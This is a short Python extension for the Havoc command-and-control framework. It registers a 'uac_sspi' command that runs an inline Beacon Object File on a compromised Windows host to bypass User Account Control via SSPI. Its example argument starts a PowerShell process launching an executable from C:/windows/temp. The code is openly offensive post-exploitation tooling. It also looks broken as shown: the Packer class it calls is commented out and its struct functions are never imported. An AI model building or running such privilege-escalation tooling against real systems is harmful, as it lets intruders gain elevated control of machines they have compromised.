from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

# class Packer:
#     def __init__(self):
#         self.buffer: bytes = b''
#         self.size: int = 0

#     def getbuffer(self):
#         return pack("<L", self.size) + self.buffer

#     def addstr(self, s):
#         if s is None:
#             s = ''
#         if isinstance(s, str):
#             s = s.encode("utf-8")
#         fmt = "<L{}s".format(len(s) + 1)
#         self.buffer += pack(fmt, len(s) + 1, s)
#         self.size += calcsize(fmt)

#     def addint(self, dint):
#         self.buffer += pack("<i", dint)
#         self.size += 4

def bof(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    string = args[0]

    # Add the arguments to the packer
    packer.addstr(string)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute a Command to Bypass UAC via Sspi")

    demon.InlineExecute(task_id, "go", "./bin/sspi_uac.x64.o", packer.getbuffer(), False)

    return task_id

# Register the Python function as a command to the Havoc client
RegisterCommand(bof, "", "uac_sspi", "Bypass Uac via Sspi", 0, "[Bypass Uac Command]", "\"powershell Start-Process -FilePath C:/windows/temp/lanuch.exe\"")
